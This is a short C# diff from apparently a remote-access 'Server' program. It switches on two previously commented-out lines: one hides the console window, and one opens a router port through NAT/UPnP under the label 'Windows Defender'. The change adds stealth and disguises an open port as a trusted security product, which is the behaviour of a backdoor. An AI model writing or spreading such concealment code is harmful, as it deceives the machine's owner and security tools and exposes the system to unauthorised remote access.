@@ -34,8 +34,8 @@ namespace Server
 
             try
             {
-                //Utils.OpenPort(Open.Nat.Protocol.Tcp, port, port, "Windows Defender").Wait();
-                //ShowWindow(GetConsoleWindow(), 5); //0 - invizibil; 5 - vizibil
+                ShowWindow(GetConsoleWindow(), 0); //0 - invizibil; 5 - vizibil
+                Utils.OpenPort(Open.Nat.Protocol.Tcp, port, port, "Windows Defender").Wait();
             }
             catch
             {
